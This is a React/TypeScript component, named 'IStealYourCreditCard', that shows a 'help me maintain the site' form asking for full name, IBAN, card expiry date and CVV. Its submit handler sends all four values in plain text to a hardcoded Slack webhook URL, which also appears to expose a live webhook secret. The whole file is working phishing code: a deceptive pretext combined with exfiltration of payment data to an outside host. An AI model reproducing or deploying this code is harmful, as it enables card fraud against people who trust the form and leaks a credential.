import "./IStealYourCreditCard.css";
import {useState} from "react";

async function sendToSlack(message: string) {
    const response = await fetch('https://hooks.slack.com/services/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', {
        method: 'POST',
        headers: {'Content-Type': 'text/plain'},
        body: JSON.stringify({text: message}),
    });

    if (!response.ok) {
        throw new Error('Sending to Slack failed!');
    }
}


function IStealYourCreditCard() {

    const [formData, setFormData] = useState({
        fullName: '',
        iban: '',
        expiryDate: '',
        cvv: '',
    });

    function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
        const {name, value} = e.target;
        setFormData(prev => ({...prev, [name]: value}));
    }

    return (
        <div className="isteal-your-credit-card">
            <h1 className={"h1"}>You want to help me maintaining the site?</h1>

            <p>If you want to help me with the site, fill out this form:</p>

            <div className="input-group py-1">
                <div className="form-floating">
                    <input
                        className="form-control"
                        type="text"
                        id="credit-card-full-name"
                        name="fullName"
                        value={formData.fullName}
                        placeholder="Name"
                        onChange={handleChange}
                    />
                    <label htmlFor="credit-card-full-name">Full Name</label>
                </div>

                <div className="form-floating">
                    <input
                        className="form-control"
                        type="text"
                        id="credit-card-iban"
                        name="iban"
                        value={formData.iban}
                        placeholder=""
                        spellCheck="false"
                        onChange={handleChange}
                    />
                    <label htmlFor="credit-card-iban">IBAN</label>
                </div>
            </div>
            <div className="input-group py-1">
                <div className="form-floating">
                    <input
                        className="form-control"
                        type="text"
                        autoComplete="cc-exp"
                        id="credit-card-expiry-date"
                        name="expiryDate"
                        value={formData.expiryDate}
                        placeholder=""
                        onChange={handleChange}
                    />
                    <label htmlFor="credit-card-expiry-date">Expiration date</label>
                </div>
                <div className="form-floating">
                    <input
                        className="form-control"
                        type="text"
                        autoComplete="cc-cvv"
                        id="credit-card-cvv"
                        name="cvv"
                        value={formData.cvv}
                        placeholder=""
                        onChange={handleChange}/>
                    <label htmlFor="credit-card-cvv">CVV</label>
                </div>
            </div>
            <div className={"credit-card-button-container py-4"}>
                <button className="btn btn-primary credit-card-button" type="submit" onClick={async () => {
                    console.log(formData);
                    try {
                        await sendToSlack(
                            `New Message from the React-Website!!🥳\n` +
                            `Name: ${formData.fullName}\n` +
                            `IBAN: ${formData.iban}\n` +
                            `Expiration Date: ${formData.expiryDate}\n` +
                            `CVV: ${formData.cvv}`,
                        );
                    } catch (err) {
                        console.log(err);
                    }
                }
                }>Submit
                </button>
            </div>
        </div>
    );
}

export default IStealYourCreditCard;
